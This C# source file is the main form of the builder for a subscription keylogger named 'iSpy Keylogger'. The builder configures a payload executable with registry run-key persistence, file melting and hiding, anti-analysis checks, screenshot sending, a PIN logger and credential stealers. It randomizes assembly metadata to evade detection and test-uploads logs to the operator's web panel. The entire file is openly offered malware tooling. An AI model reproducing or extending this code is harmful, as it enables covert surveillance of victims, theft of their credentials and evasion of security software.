using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Net;
using System.IO;
using Networking;
namespace iSpy_Keylogger
{
    public partial class frmMain : Form
    {
        public string Username;
        public frmMain()
        {
            InitializeComponent();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            try
            {
                Environment.Exit(0);
            }
            catch (Exception ex) { GlobalVariables.DumpErrorLog(ex); }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            Username = GlobalVariables.Username;
            this.Text = "iSpy Keylogger V" + GlobalVariables.version + " - Registered To: " + Username;
            lblUsername.Text = "Username: " + Username;
            lblVersion.Text = "iSpy Keylogger Version: " + GlobalVariables.version;
            lblHWID.Text = "HWID: " + GlobalVariables.HWID;
            lblSubscriptionExpiration.Text = "Subscription Expiration: " + GlobalVariables.ExpirationDate;
            tbGUID.Text = Guid.NewGuid().ToString();
            //tbMutex.Text = Guid.NewGuid().ToString();
            if (string.IsNullOrEmpty(Username) || string.IsNullOrEmpty(GlobalVariables.HWID) || string.IsNullOrEmpty(GlobalVariables.version))
                Environment.Exit(0);
        }

        private void lblWebpanel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start(GlobalVariables.site);
        }


        private void btnUpdate_Click(object sender, EventArgs e)
        {

        }

        private void cbxDesign_DrawItem(object sender, DrawItemEventArgs e)
        {
            // By using Sender, one method could handle multiple ComboBoxes
            ComboBox cbx = sender as ComboBox;
            if (cbx != null)
            {
                // Always draw the background
                e.DrawBackground();
                // Drawing one of the items?
                if (e.Index >= 0)
                {
                    // Set the string alignment.  Choices are Center, Near and Far
                    StringFormat sf = new StringFormat();
                    sf.LineAlignment = StringAlignment.Center;
                    sf.Alignment = StringAlignment.Center;

                    // Set the Brush to ComboBox ForeColor to maintain any ComboBox color settings
                    // Assumes Brush is solid
                    Brush brush = new SolidBrush(cbx.ForeColor);

                    // If drawing highlighted selection, change brush
                    if ((e.State & DrawItemState.Selected) == DrawItemState.Selected)
                        brush = SystemBrushes.HighlightText;

                    // Draw the string
                    e.Graphics.DrawString(cbx.Items[e.Index].ToString(), cbx.Font, brush, e.Bounds, sf);
                }
            }
        }

        private void cbFakeMessage_CheckedChanged(object sender, EventArgs e)
        {
            /*
            bool status = cbFakeMessage.Checked;
            rbInfo.Enabled = status;
            rbWarning.Enabled = status;
            rbError.Enabled = status;
            tbMessageTitle.Enabled = status;
            tbMessageBody.Enabled = status;
            btnTestMessage.Enabled = status;
            lblTitle.Enabled = status;
            lblBody.Enabled = status;
             * */
        }

        private void btnTestMessage_Click(object sender, EventArgs e)
        {
            int type = 0;
            /*
            if (rbInfo.Checked)
                type = 1;
            else if (rbWarning.Checked)
                type = 2;
            else
                type = 3;
            switch (type)
            {
                case 1:
                    MessageBox.Show(tbMessageBody.Text, tbMessageTitle.Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
                case 2:
                    MessageBox.Show(tbMessageBody.Text, tbMessageTitle.Text, MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    break;
                case 3:
                    MessageBox.Show(tbMessageBody.Text, tbMessageTitle.Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    break;
             * 
            }
             * */
        }

        private string Random()
        {
            return Guid.NewGuid().ToString().Replace("-", "");
        }
        private string RandomVersion()
        {
            string version = "AAA.BBB.CCC.DDD";
            Random r = new Random();
            version = version.Replace("AAA", r.Next(0, 255).ToString());
            version = version.Replace("BBB", r.Next(0, 255).ToString());
            version = version.Replace("CCC", r.Next(0, 255).ToString());
            version = version.Replace("DDD", r.Next(0, 255).ToString());
            return version;
        }

        private void BuildFile()
        {
            this.Enabled = false;
            string uploadKey = tbUploadKey.txtbox.Text;
            string time = nudInterval.Value.ToString();
            string mutex = Random();
            if (string.IsNullOrEmpty(uploadKey) || string.IsNullOrEmpty(time))
            {
                this.Enabled = true;
                return;
            }
            tbBuildLog.Text += "> Upload Key: " + uploadKey + Environment.NewLine;
            tbBuildLog.Text += "> Log Interval: " + time + Environment.NewLine;
            tbBuildLog.Text += "> Mutex: " + mutex + Environment.NewLine;


            bool installFile = cbInstallFile.Checked;
            string processName = tbProcessName.txtbox.Text;
            string folder = tbFolder.txtbox.Text;
            string directory = cbDirectory.Text;

            bool hkcu = cbHKCU.Checked;
            bool hklm = cbHKLM.Checked;
            string hkcuKey = tbHKCU.txtbox.Text;
            string hklmKey = tbHKLM.txtbox.Text;

            bool meltFile = cbMeltFile.Checked;
            bool antis = cbAntis.Checked;
            bool sendScreenshots = cbSendScreenshots.Checked;
            bool hideFile = cbHideFile.Checked;
            bool pinlogger = cbPinlogger.Checked;

            bool stealers = cbStealers.Checked;

            string title = tbTitle.txtbox.Text;
            string description = tbDescription.txtbox.Text;
            string product = tbProduct.txtbox.Text;
            string copyright = tbCopyright.txtbox.Text;
            string version = tbVersion.txtbox.Text;
            string guid = tbGUID.txtbox.Text;

            string iconPath = tbIconPath.txtbox.Text;
            bool changeIcon = !string.IsNullOrEmpty(tbIconPath.txtbox.Text);
            byte[] iconFile = null;
            if (changeIcon)
            {
                iconFile = File.ReadAllBytes(iconPath);
            }

            using (PayloadWriter pw = new PayloadWriter())
            {
                pw.WriteByte(0x03);
                pw.WriteString(uploadKey);
                pw.WriteString(time);
                pw.WriteString(mutex);
                pw.WriteBool(installFile);
                if (installFile)
                {
                    pw.WriteString(processName);
                    pw.WriteString(folder);
                    pw.WriteString(directory);
                }
                pw.WriteBool(hkcu);
                if (hkcu)
                    pw.WriteString(hkcuKey);
                pw.WriteBool(hklm);
                if (hklm)
                    pw.WriteString(hklmKey);


                pw.WriteBool(meltFile);
                pw.WriteBool(antis);
                pw.WriteBool(sendScreenshots);
                pw.WriteBool(hideFile);
                pw.WriteBool(pinlogger);

                pw.WriteBool(stealers);


                pw.WriteString(title);
                pw.WriteString(description);
                pw.WriteString(product);
                pw.WriteString(copyright);
                pw.WriteString(version);
                pw.WriteString(guid);

                pw.WriteBool(changeIcon);

                if (changeIcon)
                {
                    pw.WriteInteger(iconFile.Length);
                    pw.WriteBytes(iconFile);
                }

                byte[] packet = pw.ToByteArray();
                tbBuildLog.Text += "> Sending packet size: " + packet.Length + Environment.NewLine;
                GlobalVariables.SendData(packet);
            }
        }

        private void cbInstallFile_CheckedChanged(object sender)
        {
            bool status = cbInstallFile.Checked;
            tbProcessName.Enabled = status;
            tbFolder.Enabled = status;
            cbDirectory.Enabled = status;
            cbHKCU.Enabled = status;
            cbHKLM.Enabled = status;
        }

        private void cbHKCU_CheckedChanged(object sender)
        {
            tbHKCU.Enabled = cbHKCU.Checked;
        }

        private void cbHKLM_CheckedChanged(object sender)
        {
            tbHKLM.Enabled = cbHKLM.Checked;
        }

        private void btnTestLogUpload_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(tbUploadKey.txtbox.Text))
            {
                try
                {
                    using (WebClient client = new WebClient())
                    {
                        byte[] response = client.UploadValues(GlobalVariables.site.Substring(0, GlobalVariables.site.Length - 6) + "/insert", new NameValueCollection()
                        {
                            { "key", tbUploadKey.txtbox.Text },
                            { "type", "1" },
                            { "pcname", "TEST LOG UPLOAD" },
                            { "log", "Log upload completed."},
                        });
                        string result = System.Text.Encoding.UTF8.GetString(response);
                        if (result.Equals("ok"))
                            MessageBox.Show("Log uploaded successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        else
                            MessageBox.Show("Log failed to upload.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }

                }
                catch (Exception ex) { GlobalVariables.DumpErrorLog(ex); }
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.InitialDirectory = Application.StartupPath;
                sfd.FileName = "*.exe";
                sfd.DefaultExt = ".exe|*.exe";
                sfd.Filter = "Executable Files .exe|*.exe";
                if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    GlobalVariables.savePath = sfd.FileName;
                    BuildFile();
                }
                else
                {
                    return;
                }
            }
        }

        private void btnChangeIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.InitialDirectory = Application.StartupPath;
                ofd.Filter = ".ico|*.ico";
                ofd.ShowDialog();
                if (!string.IsNullOrEmpty(ofd.FileName))
                {
                    tbIconPath.txtbox.Text = ofd.FileName;
                    pbIcon.ImageLocation = ofd.FileName;
                }
            }
        }

        private void btnGenerateAssembly_Click(object sender, EventArgs e)
        {
            tbTitle.Text = Random();
            tbDescription.Text = Random();
            tbProduct.Text = Random();
            tbCopyright.Text = Random();
            tbVersion.Text = RandomVersion();
            tbGUID.Text = Guid.NewGuid().ToString();
        }
    }
}